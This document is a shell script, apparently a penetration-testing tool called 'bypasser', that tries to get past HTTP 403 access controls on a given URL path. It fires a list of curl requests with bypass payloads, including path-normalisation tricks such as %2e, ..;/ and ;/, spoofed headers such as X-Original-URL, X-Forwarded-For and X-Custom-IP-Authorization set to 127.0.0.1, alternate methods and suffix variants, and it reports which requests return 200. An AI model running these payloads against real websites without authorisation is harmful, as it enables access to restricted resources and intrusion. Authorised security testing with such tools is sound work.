#!/bin/sh

YELLOW='\033[0;33m'
GREEN='\033[1;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e """
${YELLOW}██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗  ██████╔╝
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║██╔══╝  ██╔══██╗
██████╔╝   ██║   ██║     ██║  ██║███████║███████║███████╗██║  ██║
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝${NC}
                                            ${GREEN}FB/sharifansari00${NC}
Example: ./bypasser.sh https://example.com path
"""

check_url() {
  status1=`curl -k -s -o /dev/null -iL -w "%{http_code}" "$@"`
  status2=`curl -k -s -o /dev/null -i -w "%{http_code}" "$@"`
  if [ "$status1" -eq 200 ]; then
    echo -e "${GREEN}$status1  --> $@${NC}${YELLOW}   --->   Redirect${NC}"
  else
    echo -e "${RED}$status1  --> $@${NC}${YELLOW}   --->   Redirect${NC}"
  fi
  if [ "$status2" -eq 200 ]; then
    echo -e "${GREEN}$status2  --> $@${NC}   --->   No Redirect"
  else
    echo -e "${RED}$status2  --> $@${NC}   --->   No Redirect"
  fi
}

check_url "$1/$2"
check_url "$1/%2e/$2"
check_url "$1/$2/."
check_url "$1//$2//"
check_url "$1/./$2/./"
check_url "$1/$2" -H "X-Original-URL: $2"
check_url "$1/$2" -H "X-Custom-IP-Authorization: 127.0.0.1"
check_url "$1/$2" -H "X-Forwarded-For: http://127.0.0.1"
check_url "$1/$2" -H "X-Forwarded-For: 127.0.0.1:80"
check_url "$1" -H "X-rewrite-url: $2"
check_url -X POST "$1/$2" -H "Content-Length:0"
check_url -X TRACE "$1/$2"
check_url "$1/$2" -H "X-Host: 127.0.0.1"
check_url "$1/$2%20"
check_url "$1/$2%09"
check_url "$1/$2?"
check_url "$1/$2.html"
check_url "$1/$2/?anything"
check_url "$1/$2#"
check_url "$1/$2/*"
check_url "$1/$2.php"
check_url "$1/$2.json"
check_url "$1/$2..;/"
check_url "$1/$2;/"
